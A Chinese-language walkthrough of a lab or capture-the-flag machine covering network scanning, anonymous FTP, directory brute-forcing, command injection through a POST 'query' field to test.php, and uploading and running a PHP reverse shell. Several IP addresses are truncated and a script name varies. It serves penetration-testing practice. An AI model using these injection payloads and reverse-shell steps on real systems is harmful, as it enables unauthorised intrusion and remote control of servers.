二、网络扫描

使用netdiscover扫描网络中的目标机

Netdiscover

发现目标机192.168.245.148

我们发现了目标机192.168.。再使用nmap扫描目标机的端口和服务。

Nmap -p- -A 192.168.245.148

目标机上的ftp服务21端口允许匿名登陆，让我们开始登陆FTP端口，查找共享文件。发现Note文件，我们下载note到本地，并阅读其内容。

ftp 192.168.

三、枚举信息

由于80端口开放，我们将访问web浏览器以探索Http服务。获取的信息很有限

Nmap的结果显示8000端口上运行着Nginx服务软件。我们再访问8000端口，获取信息。

根据现在掌握的信息，我们没有办法进一步行动。因此，使用dirb来进行目录爆破，从结果中，发现存在drupal和wordpress。但是再浏览时，发现这些只是空目录。

Dirb http://192.168.245.148

Dirb http://192.168.245.148:8000

我们再爆破服务器上的敏感文件时，我发现服务器上存在test.php和keyword.py文件。要做的第一件事是读取PHP文件的内容。

Dirb http://192.168. :8000 -X .php,.txt,.py

我们使用curl访问test.php的请求时，我们发现它提示我们要求使用POST来请求特定的URL

Curl http://192.168.245.148:8000/test.php

再来访问keyword.py文件，并执行提供信息的脚本keyword.py。keyword.py文件仅将单词存储到列表中，然后计算每个单词出现的次数。

Wget http://192.168.:8000/keyword.py

Python3 keywords.py –help

Python3 keywords.py –-query http://192.168:8000/test.php

Python3 keywords.py –-query http://192.168/

Python3 keywords.py –query http://192.168/drupal

Python3 keywords.py –query http://192.168/wordpress

四、Exploit

尝试将POST请求发送到test.php,如下所示。因此结果表明test.php脚本充当装饰器，该装饰器试图将数据传递给keyword.py脚本并将输出返回给请求。可以尝试将其转义为RCE。经过尝试终于成功RCE。剩下的就是获取webshell。

Curl -d “query=http://192.168/wordpress” http://192.168:8000/test.php

Curl -d “query=http://192.168/wordpress;id” http://192.168:8000/test.php

在使用RCE进行了一些操作之后，进行爆破并创建PHP Reverse Shell，并将其从计算机上传到目标服务器以获取root权限。为了实现这一点，我们执行了php反向shell。并且还使用netcat建立了反向连接。

Curl -d “query=http://192.168/wordpress;pwd;ls al” http://192.168.245.148:8000/test.php

我使用netbox这个简易的asp服务软件。绿色版运行就可以了。非常好用。

Curl -d “query=http://192.168/wordpress;wget http://192.168.245.148:8000/phpshell.php;ls -al” http://192.168.245.148:8000/test.php

Curl -d “query=http://192.168/wordpress;php phpshell.php” http://192.168.245.148:8000/test.php
